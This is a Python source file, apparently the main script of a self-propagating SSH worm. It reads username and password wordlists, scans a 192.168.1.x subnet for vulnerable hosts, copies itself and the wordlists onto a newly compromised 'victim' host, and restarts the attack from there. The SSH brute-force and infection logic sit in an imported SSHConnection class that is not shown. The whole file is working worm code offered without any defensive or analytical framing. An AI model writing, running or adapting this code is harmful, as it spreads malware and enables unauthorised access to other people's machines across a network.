from SSHConnection import SSHConnection
import sys
import argparse
import os

def main():

    """ Let user specify username and passwordfiles at command line  """
    parser = argparse.ArgumentParser()
    parser.add_argument("usernames", nargs=1, help="File of usernames to try", type=str)
    parser.add_argument("passwords", nargs=1, help="File of passwords to try", type=str)
    args = parser.parse_args()
    username_file = args.usernames[0]
    password_file = args.passwords[0]

    """ Create Instance of the SSH class """
    worm = SSHConnection()

    """ Set locations  to place on victim system """
    worm_file = os.path.basename(sys.argv[0])
    host_dir = os.path.dirname(sys.argv[0])
    worm.set_target_dir(host_dir + "/")
    worm.set_host_dir(host_dir + "/")
    worm.set_files([worm_file, username_file, password_file])
    """ Sets target directory to be same as one as where it was launched """
    """ Set default vulnerable hosts to scan """
    worm.retrieve_vulnerable_hosts("192.168.1.", 10)
    """ Find a target to infect, checks to make sure target hasn't previously
        been infected """
    if worm.find_target_host():
        """ Mark host system"""
        worm.place_worm()
        """ Start attack from new system """
        worm.start_attack()
    else:
        with open ("/tmp/no_found_hosts.txt", "w") as no_hosts:
            no_hosts.write("no hosts found")
    return

if __name__ == "__main__":
    main()
